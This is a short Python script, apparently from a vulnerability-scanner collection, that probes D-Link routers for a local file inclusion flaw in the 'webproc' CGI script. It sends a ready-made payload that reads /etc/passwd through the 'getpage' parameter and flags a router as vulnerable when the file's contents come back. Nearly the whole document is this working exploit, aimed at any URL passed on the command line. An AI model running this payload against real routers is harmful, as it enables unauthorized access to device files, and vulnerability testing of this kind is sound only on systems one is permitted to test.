#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dlink 本地文件包含
referer: https://www.exploit-db.com/exploits/37516
author: Lucifer
description: the router suffers from an authenticated file inclusion vulnerability
(LFI) when input passed thru the 'getpage' parameter to 'webproc' script is
not properly verified before being used to include files. This can be exploited
to include files from local resources.
'''
import sys
import requests
import warnings
from termcolor import cprint

class router_dlink_webproc_fileread_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text:
                cprint("[+]存在Dlink 本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = router_dlink_webproc_fileread_BaseVerify(sys.argv[1])
    testVuln.run()